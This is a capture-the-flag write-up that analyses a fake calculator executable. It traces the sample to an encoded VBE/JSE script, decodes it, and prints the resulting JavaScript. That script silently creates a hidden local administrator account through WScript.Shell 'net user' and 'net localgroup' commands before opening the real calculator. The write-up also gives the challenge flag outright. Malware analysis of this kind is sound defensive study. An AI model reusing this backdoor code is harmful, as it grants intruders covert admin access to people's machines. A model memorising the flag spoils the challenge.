I got this new calculator app from my friend! But it's really weird, for some reason it needs admin permissions to run??

NOTE: Archive password is strange_calc

Download the file(s) below.

# Flag: flag{9922fb21aaf1757e3fdb28d7890a5d93}
# Solution

Starting from calc.exe (MD5: `2f9fdad776d8626f2ce8625211831e91`), look for it on ANY.RUN and pick one of the results that triggered the sample. E.g.: https://app.any.run/tasks/35de93a5-c64f-4db2-80d1-a98edccea1e1

It can be seen that calc.exe calls `wscript.exe` with a file like {random}.jse. It is in fact a vbe file (visual basic encoded). From ANY.RUN copy its contents (in hex and only like 100 bytes at a time).

The result is a encoded microsoft script, that can be automatically decoded with [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Hex('Auto')Microsoft_Script_Decoder()&input=MjM0MDdFNUU2MzUxNEQ0MTQxNDEzRDNENTcyMTc4NUU0NDZCNEI3ODUwNkQ2MDI4NjIwOTM3NkMyRTUwMzEyNzQ1NDU0MjRFMjcyODIwMkY2MTU2NkI0NDYzNDUyRDA5NEEyQTY5NTc1NzJFNjMzNzZDMkU1MDdGNzgyMTcwMkI0MDIxNUI2MzU2MkI1NTRDNDQ3NDQ5MkIzMzUxMkEwOTJENkQ0NDJDMzAyNzM5MjQ3RjQ0NTI0RDJCMzI1NjZENkQ2RTYzNEEzNzJENkI1MTc1MjcyRjVGNjYyNjRDN0U0NTQyMkE2OTcyMzA2MzU3NjM2QjU1NEU3RjYxNzIzNjYwNDUzODdGNkY2QjU1NDUyQTI3NzgyNzVBNkIyRDMwMjA2Mjc4MzkyQjM2N0QzMDc2NDUyQjA5NEU0NTIzN0IyNzc4NTQyRDc1MzA3Qjc4Mjc3MjRBMjMzMTQ3NTU1OTYyNzgyMTJCNDk1QzQzMkUyQzZGNzg2MDM2MjA2RDM0NkMyRTJGNEI0RTJCMjk0Rjc2MjE2MjRGMzIyQjJBNUI3RjMyNjkzNjU3NDQ3NjVDNkQyRTUwMzQyNzcxNjkzNDQwMjE1NzIwNUUyQjc4NTQ0Rjc0NzA3NDVGN0IyQTYyMDk2MjMwNzY3NDUxMjY0MDJBNzgzNjUyNzMyQjA5NEM1OTM0MjMzODJFN0Y2QzMzNDkyRDZENDQ3RTZCN0I2MzM2NTI1RTM0NkM0RDVBNTczOTJCN0E0RjYwMzQyMzUyMjY3OTIzMjc3RjMyN0U0QzdCNjMzMDYzNkQ3NDZEMkUyRjU3MzkyQjdBNTk2Mzc0NTE3MTJBNEY2NjIwMkEyNzc2MzI3RTU2Nzg3NjMwNTI1RTM0NkQ0NDJGNTczOTZFN0E1OTYzMzQ1Rjc5MjM0RjMyMjAyQTI3NzYzMjdFNzMyNzc2MzAyMDVFMzQ2QzQ0M0I0NzRFN0Y2MjU5NzYzNDUxMjYyQTRGMzIyMDYyNUI3RjY2NzA2RDUxMjc1NTRGNDQ2Mjc4NEMyMDM2NDQ1NzY4MkYzNDZDMkU1QTRCNUI3RjYwNjM2MjQwMjE0MDIxMjAyMzJENjA0RTQwMkE0MDJBNTcyMzYyNjk2MjMwNjMzNDMzMjA0MDIxMzYyMDU2N0Y3ODZGNDQzNDUyNDYyQTZEMzMyNzZBNTkyRTcyMDk2RjIwMzA0RDQ3M0EzQjc0NDMyRTNCNTc0RTZFNjM3NjYwMjU1QjM4NTgyQTQwMjE0MDIxNTcyMzJENjAzMzQwMkE0MDJBNzk2MjIzNzA2QjU3NjAzNDVGNjY0MDIxMzY1MjU2N0Y1NTZGNDQ3NDRGMzg2MjVFNUY3QjNGNDQ0NDcyNzg0QzIwMzY0NDQ3M0EzQjM0NkM0RDVBNDc1QjdGNjA2MDYzNTY0QzI2NjI0MDIxNDAyMTdGMkE3NTczMkEzODI5NDQyQjQ0NDU0RDU1NTAzMTUyNjQ0NTI4MkY0RjJFNjI3ODZGNzY1NDdFNTQyMzM4Mzc0MzJFNTA3MzI3NzIzNDZFNkY3MjU1MkM3NjJBNjMyQzUyMkQwOTREMzE2RjM1NjIyQzA5NEE0OTUyNjY2MDIyMzE3NzYwNUQ0Mjc2NzU2MjJDM0I1RTcxNTIyNjdCMzI1MzJFNEY2NjMwMkY3NjI4MkM1QjQwMjEyODYzMjYyMjdBNTI3RjIxNDk3RTcxNEI0RDJENTU3QzI3Nzg2RTc4Mzk0NTY5Mzc2QzJFN0UwOTI3NkM2MzY4MkE2OTJENkM0RDdFNEIyNzJDNzI3ODdGNTk1MDIxMkY3RjJFNTA2NDU3NUU2QzVFNjI1QjY4NjI3ODZCNkI0RjQ0NkQ1OTU3NEQ3RTQ1NUYwOTVGNzI1MDI2NkM1QjVCNzI3RTQ1Nzg3RjRGNTA1RTU3NUU0MzVFNkY0NDQ3M0I2MTUwNDM0RTczNzIwOTZCNjQ0NDQ0NkQ1OTU3NEQyRjJDNEE1NzMxNkM3MzYyMzkzQTcyNTU2MjJGNTk0RDQzNTk0QjQ0NTA0QTQzNUI0RTcyN0U3MjZENDM1NjVFMjA3RjM2NkU0QTU5NDk1QzZENDQ3RTMyN0I3ODJCNDE3RTdBNkQ0RjZCMzc2RTZGNzIzODRFMkIzMTU5NjA0NTdGNTU1RTQ0NjI3NzRGNTI1NTc0NkU3MzVFNDIyMzcwNTc1NzRENjA1QzZEMkU3RTNCN0IyMTcwM0I0MDIxNTcyMDczN0Y3ODRDNTkzNDUyNDY3MDNCNTE1MTJBMDk3NzIwNUQyMTc4NjM1NzVEMzU1OTdFNTQ0MjMwNkQ1NjJGN0YyMzI5MzI1MjIyNDU1NTYwNEIyNDJCNDQ0MjQ2N0UzNjQzNTY2QjJCMjM3MDM0NTI0MTQyNDE0MTNEM0Q1RTIzN0U0MHY&oeol=VT).

The resulting file is a working javascript that computes the flag but does not print it. In order to get the flag, print the `c` string right before the return from function `a`.


This is the modified script that prints the flag and crashes. Try it on any online JS service
```js
function a(b) {
    var c = "",
        d = b.split("\n");
    for (var e = 0; e < d.length; e++) {
        var f = d[e].replace(/^\s+|\s+$/g, '');
        if (f.indexOf("begin") === 0 || f.indexOf("end") === 0 || f === "") continue;
        var g = (f.charCodeAt(0) - 32) & 63;
        for (var h = 1; h < f.length; h += 4) {
            if (h + 3 >= f.length) break;
            var i = (f.charCodeAt(h) - 32) & 63,
                j = (f.charCodeAt(h + 1) - 32) & 63,
                k = (f.charCodeAt(h + 2) - 32) & 63,
                l = (f.charCodeAt(h + 3) - 32) & 63;
            c += String.fromCharCode((i << 2) | (j >> 4));
            if (h + 2 < f.length - 1) c += String.fromCharCode(((j & 15) << 4) | (k >> 2));
            if (h + 3 < f.length - 1) c += String.fromCharCode(((k & 3) << 6) | l)
        }
    }
    alert(c)
    return c.substring(0, g)
}
var m = "begin 644 -\nG9FQA9WLY.3(R9F(R,6%A9C$W-3=E,V9D8C(X9#<X.3!A-60Y,WT*\n`\nend";
var n = a(m);
var o = ["net user LocalAdministrator " + n + " /add", "net localgroup administrators LocalAdministrator /add", "calc.exe"];
var p = new ActiveXObject('WScript.Shell');
for (var q = 0; q < o.length - 1; q++) {
    p.Run(o[q], 0, false)
}
p.Run(o[2], 1, false);
```